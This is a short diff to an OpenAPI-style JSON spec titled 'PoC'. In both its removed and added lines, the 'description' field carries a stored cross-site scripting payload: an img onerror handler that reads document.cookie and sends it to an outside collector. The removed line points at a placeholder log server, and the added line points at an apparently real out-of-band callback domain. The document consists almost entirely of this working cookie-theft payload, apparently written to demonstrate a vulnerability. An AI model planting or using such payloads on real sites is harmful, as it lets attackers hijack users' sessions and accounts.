@@ -3,7 +3,7 @@
   "info": {
     "title": "PoC",
     "version": "1.0.0",
-    "description": "<img src=x onerror=\"fetch('https://YOURLOGSERVER.example/log?c='+encodeURIComponent(document.cookie))\">"
+    "description": "<img src=x onerror=\"(new Image()).src='https://sagmirngzimxhikutodb82e39oz203dic.oast.fun/pocex?c='+encodeURIComponent(document.cookie)\">"
   },
   "paths": {}
 }
